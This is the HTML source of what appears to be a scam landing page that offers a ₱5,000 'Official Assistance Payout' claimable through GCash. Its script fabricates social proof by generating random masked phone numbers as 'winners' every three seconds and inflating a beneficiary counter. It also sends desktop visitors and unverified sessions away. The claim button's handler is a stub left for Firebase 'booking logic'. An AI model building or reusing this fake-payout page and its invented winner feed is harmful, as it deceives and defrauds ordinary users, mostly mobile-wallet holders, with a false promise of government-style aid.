<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Official Assistance Payout</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nature-green: #2d6a4f;
            --emerald: #40916c;
            --white-glass: rgba(255, 255, 255, 0.95);
            --text-dark: #1b4332;
            --gcash-blue: #007dfe;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: var(--white-glass);
            width: 100%;
            max-width: 400px;
            padding: 25px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .logo-img { width: 180px; margin-bottom: 15px; border-radius: 12px; }
        .amount { font-family: 'Quicksand', sans-serif; font-size: 42px; font-weight: 700; color: var(--nature-green); margin-bottom: 20px; }
        
        .pay-button { 
            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
            color: white; width: 100%; padding: 18px; border: none; border-radius: 15px; 
            font-size: 16px; font-weight: 700; cursor: pointer;
        }

        .promo-photo { width: 100%; border-radius: 15px; margin-top: 15px; }

        /* WINNERS LIST AREA */
        .winners-container {
            margin-top: 20px;
            text-align: left;
            background: #f8fdfb;
            padding: 15px;
            border-radius: 20px;
            border: 1px solid #e0f2ea;
            min-height: 250px; /* Space for 5 items */
        }

        .winners-container h3 {
            font-size: 12px;
            color: #40916c;
            text-transform: uppercase;
            text-align: center;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        #winners-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        /* 3 SECONDS TRANSITION ANIMATION */
        .winner-item {
            background: white;
            padding: 10px 15px;
            border-radius: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
            border: 1px solid #eee;
            opacity: 0;
            transform: translateY(20px);
            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        @keyframes popIn {
            to { opacity: 1; transform: translateY(0); }
        }

        .gcash-mini {
            width: 20px;
            height: 20px;
            border-radius: 4px;
            background: var(--gcash-blue);
        }

        .payout-green { color: #2d6a4f; font-weight: 800; font-size: 14px; }
        .phone-num { font-size: 14px; font-weight: 600; color: #444; }

        .live-footer {
            margin-top: 12px;
            font-size: 10px;
            color: #666;
            text-align: center;
            font-weight: 700;
        }
        .dot { height: 6px; width: 6px; background: red; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
    <h1>Available Assistance</h1>
    <div class="amount" id="balanceText">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">CLAIM THRU GCASH</button>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">

    <div class="winners-container">
        <h3><span class="dot"></span> Live Success Stories</h3>
        <div id="winners-list">
            </div>
        <div class="live-footer">
            <span id="beneficiary-count">20</span> Beneficiaries Today
        </div>
    </div>
</div>

<script src="config.js?v=4"></script>
<script>
    // Security & Mobile Check
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if (!isMobile || sessionStorage.getItem('verified_user') !== 'true') {
        window.location.href = "index.html"; 
    }

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Winners Generator
    let totalBeneficiaries = 20;
    const prefixes = ['0912', '0915', '0916', '0917', '0927', '0935', '0945', '0955', '0966', '0998'];

    function addNewWinner() {
        const list = document.getElementById('winners-list');
        const countDisplay = document.getElementById('beneficiary-count');
        
        // Random Data
        const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
        const suffix = Math.floor(1000 + Math.random() * 8999);
        totalBeneficiaries++;
        countDisplay.innerText = totalBeneficiaries.toLocaleString();

        // Create Element
        const item = document.createElement('div');
        item.className = 'winner-item';
        item.innerHTML = `
            <div style="display:flex; align-items:center; gap:10px;">
                <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-mini" onerror="this.style.background='#007dfe'">
                <span class="phone-num">${pref}***${suffix}</span>
            </div>
            <span class="payout-green">+₱5,000</span>
        `;

        // Add to top
        list.prepend(item);

        // Maintain only 5 items
        if (list.children.length > 5) {
            list.removeChild(list.lastChild);
        }
    }

    // Initialize 3 winners immediately, then loop every 3 seconds
    document.addEventListener("DOMContentLoaded", () => {
        addNewWinner();
        setTimeout(addNewWinner, 1000);
        setTimeout(addNewWinner, 2000);
        
        // 3 SECONDS REFRESH RATE
        setInterval(addNewWinner, 3000); 
    });

    // Dummy Function for Redirect (Replace with your actual Firebase logic if needed)
    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        btn.disabled = true;
        btn.innerText = "CHECKING SLOTS...";
        // ... (Your existing Firebase Booking Logic here)
    }
</script>

</body>
</html>
